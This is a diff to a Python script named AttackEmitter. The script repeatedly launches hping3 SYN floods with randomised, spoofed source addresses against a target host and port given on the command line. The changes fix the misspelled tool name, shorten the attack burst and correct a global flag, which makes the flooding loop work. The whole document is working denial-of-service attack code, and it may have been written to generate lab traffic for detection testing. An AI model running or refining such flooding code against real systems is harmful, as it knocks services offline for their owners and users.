@@ -10,9 +10,10 @@ class Killer(threading.Thread):
         self.process = process
 
     def run(self) -> None:
-        time.sleep(10)
+        time.sleep(3)
         self.process.terminate()
         time.sleep(delay)
+        global is_attacking
         is_attacking = False
 
 
@@ -20,6 +21,7 @@ is_attacking = False
 delay = 0
 target = ''
 port = 80
+
 
 if len(sys.argv) != 4:
     print("Usage: python3 AttackEmitter [target] [port] [delay]")
@@ -33,14 +35,12 @@ while True:
     try:
         if not is_attacking:
             attack = subprocess.Popen([
-                'hpign3', '-S', '--flood', '--rand-source', '-p', port, target
+                'hping3', '-S', '--flood', '--rand-source', '-p', port, target
             ], stdout=subprocess.PIPE)
             is_attacking = True
 
             killer = Killer(attack)
             killer.start()
-
-            time.sleep(delay)
     except KeyboardInterrupt:
         print("Stop attack")
         exit(0)
